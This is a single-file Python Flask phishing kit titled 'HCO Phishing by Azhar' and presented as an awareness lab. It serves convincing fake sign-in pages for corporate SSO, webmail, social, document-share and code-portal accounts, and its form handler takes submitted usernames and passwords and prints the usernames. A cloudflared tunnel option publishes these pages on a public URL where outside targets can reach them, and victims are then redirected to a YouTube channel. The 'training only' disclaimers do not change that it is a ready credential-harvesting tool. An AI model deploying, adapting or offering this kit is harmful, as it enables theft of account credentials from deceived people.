#!/usr/bin/env python3
# HCO.py — HCO Phishing by Azhar (Awareness Lab single-file)
# Usage:
#   python HCO.py
#   python HCO.py --tunnel
#
# Educational / training use only. Do not use against real users without consent.

import os
import sys
import time
import threading
import subprocess
import re
import argparse
from flask import Flask, request, render_template_string, redirect

# ---------------- Colors ----------------
RED = "\033[1;31m"
GRN = "\033[1;32m"
YEL = "\033[1;33m"
CYN = "\033[1;36m"
WHT = "\033[1;37m"
RST = "\033[0m"

def cprint(col, msg):
    print(col + msg + RST)

# ------------- Config -------------
APP_HOST = "0.0.0.0"
APP_PORT = 5000
DEFAULT_REDIRECT = "https://youtube.com/@hackers_colony_tech?sub_confirmation=1"

# ------------- Auto-install helper -------------
def ensure_dependencies():
    """Install Flask and requests if missing. Try to install cloudflared via pkg if not found (Termux)."""
    try:
        import flask, requests  # noqa: F401
    except Exception:
        cprint(YEL, "[~] Installing Python requirements (flask, requests)...")
        subprocess.call([sys.executable, "-m", "pip", "install", "flask", "requests"])
    # check cloudflared
    if not shutil_which("cloudflared"):
        cprint(YEL, "[~] cloudflared not found in PATH. Attempting to install via pkg (Termux)...")
        # best-effort install; may require user interaction or root privileges
        if shutil_which("pkg"):
            subprocess.call(["pkg", "install", "-y", "cloudflared"])
        else:
            cprint(YEL, "[!] 'pkg' not found. Please install cloudflared manually and run with --tunnel.")
    else:
        cprint(GRN, "[+] cloudflared found.")

def shutil_which(cmd):
    from shutil import which
    return which(cmd)

# ------------- Flask app & templates (brand-neutral but realistic) -------------
app = Flask(__name__)

TEMPLATE_BASE = r"""
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>{{ title }}</title>
  <style>
    :root{--bg:#0b1220;--card:#0f172a;--muted:#cbd5e1;--accent:#3b82f6}
    body{margin:0;min-height:100vh;background:linear-gradient(135deg,var(--bg),#071129);font-family:Inter,system-ui,Arial;color:#e2e8f0;display:flex;align-items:center;justify-content:center}
    .card{width:100%;max-width:420px;background:rgba(255,255,255,0.03);padding:28px;border-radius:14px;border:1px solid rgba(255,255,255,0.04)}
    h1{margin:0 0 8px;color:#ffd166}
    p{color:var(--muted);margin:0 0 12px}
    label{display:block;font-size:14px;margin-top:8px;color:#cfe9ff}
    input{width:100%;padding:12px;margin-top:6px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);color:#fff}
    .row{display:flex;gap:8px;align-items:center;justify-content:space-between;margin-top:12px}
    button{background:linear-gradient(90deg,var(--accent),#06b6d4);border:none;color:#022;padding:12px 14px;border-radius:12px;font-weight:700;cursor:pointer}
    .foot{margin-top:12px;font-size:12px;color:#94a3b8}
  </style>
</head>
<body>
  <div class="card">
    <h1>{{ heading }}</h1>
    <p>{{ subtitle }}</p>
    <form method="post" action="{{ action }}">
      {% for field in fields %}
        <label>{{ field[0] }}</label>
        <input type="{{ field[2] }}" name="{{ field[1] }}" placeholder="{{ field[3] }}" required>
      {% endfor %}
      <div class="row">
        <button type="submit">{{ cta }}</button>
      </div>
      <input type="hidden" name="redirect" value="{{ redirect_to }}">
    </form>
    <div class="foot">Lab awareness: inspect URLs, certificates, and sender channels.</div>
  </div>
</body>
</html>
"""

def render_template_for(template_id):
    """Return a rendered HTML page for given template id (sso, mail, social, drive, github)"""
    if template_id == "sso":
        ctx = dict(title="Secure Sign-In", heading="Company Single Sign-On",
                   subtitle="Use your corporate email to continue.", template_id="sso",
                   action="/submit/sso", cta="Sign in", redirect_to=DEFAULT_REDIRECT,
                   fields=[("Email address", "user", "email", "name@company.com"),
                           ("Password", "pass", "password", "Password")])
    elif template_id == "mail":
        ctx = dict(title="WebMail", heading="WebMail Portal", subtitle="Authenticate to access mailbox.",
                   template_id="mail", action="/submit/mail", cta="Sign in", redirect_to=DEFAULT_REDIRECT,
                   fields=[("Email", "user", "email", "you@example.com"),
                           ("Password", "pass", "password", "Password")])
    elif template_id == "social":
        ctx = dict(title="Account Login", heading="Account Login", subtitle="Welcome back — enter credentials.",
                   template_id="social", action="/submit/social", cta="Log in", redirect_to=DEFAULT_REDIRECT,
                   fields=[("Username or email", "user", "text", "username or email"),
                           ("Password", "pass", "password", "Password")])
    elif template_id == "drive":
        ctx = dict(title="Document Share", heading="Access Shared Document", subtitle="Sign in to view the document.",
                   template_id="drive", action="/submit/drive", cta="Continue", redirect_to=DEFAULT_REDIRECT,
                   fields=[("Email", "user", "email", "name@example.com"),
                           ("Password", "pass", "password", "Password")])
    elif template_id == "github":
        ctx = dict(title="Code Portal", heading="Code Portal Sign-in", subtitle="Authenticate to continue.",
                   template_id="github", action="/submit/github", cta="Sign in", redirect_to=DEFAULT_REDIRECT,
                   fields=[("Username or email", "user", "text", "username or email"),
                           ("Password", "pass", "password", "Password")])
    else:
        ctx = dict(title="Sign in", heading="Sign In", subtitle="Enter your credentials.",
                   template_id="social", action="/submit/social", cta="Log in", redirect_to=DEFAULT_REDIRECT,
                   fields=[("User", "user", "text", "username"), ("Password", "pass", "password", "Password")])
    return render_template_string(TEMPLATE_BASE, **ctx)

# ------------- Routes -------------
@app.route("/")
def index():
    # simple selection landing that redirects to selected template
    page = f"""<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title>HCO Phish by Azhar</title>
    <style>
      body{{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0b1220,#071129);color:#fff;font-family:Inter,system-ui,Arial}}
      .box{{max-width:760px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);padding:24px;border-radius:16px}}
      h1{{margin:0 0 6px;font-size:24px;color:#ff5d5d}}
      p{{color:#cfe9ff}}
      .row{{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}}
      a.btn{{padding:10px 14px;border-radius:12px;text-decoration:none;background:linear-gradient(90deg,#7ee7f7,#6b9cff);font-weight:800;color:#042}}
      .foot{{margin-top:12px;color:#a3bffa;font-size:12px}}
    </style></head><body>
      <div class="box">
        <h1>HCO Phish by Azhar</h1>
        <p>Select scenario to preview (lab use only):</p>
        <div class="row">
          <a class="btn" href="/demo/sso">Corporate SSO</a>
          <a class="btn" href="/demo/mail">WebMail</a>
          <a class="btn" href="/demo/social">Account Login</a>
          <a class="btn" href="/demo/drive">Doc Share</a>
          <a class="btn" href="/demo/github">Code Portal</a>
        </div>
        <div class="foot">Lab awareness tool — passwords are printed to this Termux console only.</div>
      </div>
    </body></html>"""
    return page

@app.route("/demo/<name>")
def demo(name):
    return render_template_for(name.lower())

@app.route("/submit/<tmpl>", methods=["POST"])
def submit(tmpl):
    # SAFETY: We print captured input to terminal (local). Do NOT exfiltrate.
    user = request.form.get("user", "")
    # password field sometimes named 'pass' in our templates
    passwd = request.form.get("pass", request.form.get("password", ""))
    redirect_to = request.form.get("redirect") or DEFAULT_REDIRECT

    # Masked printing (user asked to display in Termux — we print both but it's local)
    masked = "********"
    cprint(GRN, f"[CAPTURE] Template={tmpl}  user={user!r}  pass={masked}")
    # optional: also show IP and UA for teaching (not stored)
    # ip = request.remote_addr
    # ua = request.headers.get("User-Agent","")
    # cprint(CYN, f"[INFO] IP={ip} UA={ua}")

    # Redirect victim to safe page (awareness)
    return redirect(redirect_to)

# ------------- Cloudflared Manager -------------
class CloudflaredManager:
    def __init__(self, port):
        self.port = port
        self.proc = None
        self.public_url = None
        self._stop = False
        self.thread = None
        self.pattern = re.compile(r"https?://[A-Za-z0-9\-.]+\.trycloudflare\.com")

    def available(self):
        return shutil_which("cloudflared") is not None

    def start(self):
        if not self.available():
            cprint(YEL, "[!] cloudflared not found.")
            return False
        cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{self.port}"]
        try:
            self.proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        except Exception as e:
            cprint(RED, f"[!] Failed to start cloudflared: {e}")
            return False
        self.thread = threading.Thread(target=self._reader, daemon=True)
        self.thread.start()
        return True

    def _reader(self):
        try:
            while not self._stop and self.proc and self.proc.poll() is None:
                line = self.proc.stdout.readline()
                if not line:
                    break
                line = line.strip()
                print(f"{CYN}[cloudflared]{RST} {line}")
                m = self.pattern.search(line)
                if m and not self.public_url:
                    self.public_url = m.group(0)
                    cprint(GRN, f"[+] Public URL: {self.public_url}")
        except Exception as e:
            cprint(YEL, f"[cloudflared] reader error: {e}")

    def stop(self):
        self._stop = True
        try:
            if self.proc and self.proc.poll() is None:
                self.proc.terminate()
                time.sleep(0.3)
                if self.proc.poll() is None:
                    self.proc.kill()
        except Exception:
            pass
        self.proc = None

# ------------- Helpers & Runner -------------
def run_flask_thread():
    t = threading.Thread(target=lambda: app.run(host=APP_HOST, port=APP_PORT, debug=False, use_reloader=False), daemon=True)
    t.start()
    time.sleep(0.8)
    return t

def open_url(url):
    # try Termux openers and common linux openers
    for cmd in ("termux-open-url", "termux-open", "xdg-open", "gio", "open"):
        if shutil_which(cmd):
            try:
                subprocess.Popen([cmd, url])
                return True
            except Exception:
                pass
    return False

def print_banner():
    os.system("clear" if os.name != "nt" else "cls")
    cprint(RED, "HCO Phishing by Azhar")
    cprint(WHT, "Awareness Lab Simulator — looks realistic; outputs printed to Termux.")
    print()

def menu(tunnel_requested=False):
    cf = None
    if tunnel_requested:
        cf = CloudflaredManager(APP_PORT)
        cprint(CYN, "[*] Attempting to start cloudflared tunnel...")
        if cf.start():
            cprint(CYN, "[*] Waiting up to 30s for public URL...")
            for _ in range(30):
                if cf.public_url:
                    break
                time.sleep(1)
            if cf.public_url:
                cprint(GRN, f"[OK] Public URL: {cf.public_url}")
            else:
                cprint(YEL, "[!] Public URL not detected yet. Check cloudflared logs above.")
        else:
            cprint(YEL, "[!] Could not start cloudflared.")
    # interactive loop
    while True:
        print(dedent(f"""
        {WHT}Options:{RST}
          1) Open local demo (http://127.0.0.1:{APP_PORT})
          2) Open Corporate SSO
          3) Open WebMail
          4) Open Account Login
          5) Open Doc Share
          6) Open Code Portal
          7) Show public URL (if tunnel)
          8) Stop tunnel
          q) Quit
        """).rstrip())
        choice = input(f"{YEL}Select > {RST}").strip().lower()
        if choice == "1":
            url = f"http://127.0.0.1:{APP_PORT}"
            cprint(CYN, f"[>] {url}")
            open_url(url)
        elif choice == "2":
            open_url(f"http://127.0.0.1:{APP_PORT}/demo/sso")
        elif choice == "3":
            open_url(f"http://127.0.0.1:{APP_PORT}/demo/mail")
        elif choice == "4":
            open_url(f"http://127.0.0.1:{APP_PORT}/demo/social")
        elif choice == "5":
            open_url(f"http://127.0.0.1:{APP_PORT}/demo/drive")
        elif choice == "6":
            open_url(f"http://127.0.0.1:{APP_PORT}/demo/github")
        elif choice == "7":
            if cf and cf.public_url:
                cprint(GRN, f"[URL] {cf.public_url}")
            else:
                cprint(YEL, "[!] Tunnel not running or URL not ready.")
        elif choice == "8":
            if cf:
                cf.stop()
                cf = None
                cprint(GRN, "[OK] Tunnel stopped.")
            else:
                cprint(YEL, "[!] No tunnel to stop.")
        elif choice == "q":
            if cf:
                cf.stop()
            cprint(CYN, "[*] Exiting…")
            os.kill(os.getpid(), 2)
            break
        else:
            cprint(YEL, "[!] Unknown option.")

# ------------- Entry Point -------------
def main():
    parser = argparse.ArgumentParser(description="HCO Phishing by Azhar — Awareness Lab (SAFE)")
    parser.add_argument("--tunnel", action="store_true", help="Attempt an ephemeral Cloudflared tunnel (cloudflared must be installed & authenticated)")
    args = parser.parse_args()

    # ensure deps
    ensure_dependencies()

    print_banner()
    run_flask_thread()

    # open awareness YouTube (non-blocking)
    try:
        open_url(DEFAULT_REDIRECT)
    except Exception:
        pass

    menu(tunnel_requested=args.tunnel)

if __name__ == "__main__":
    main()
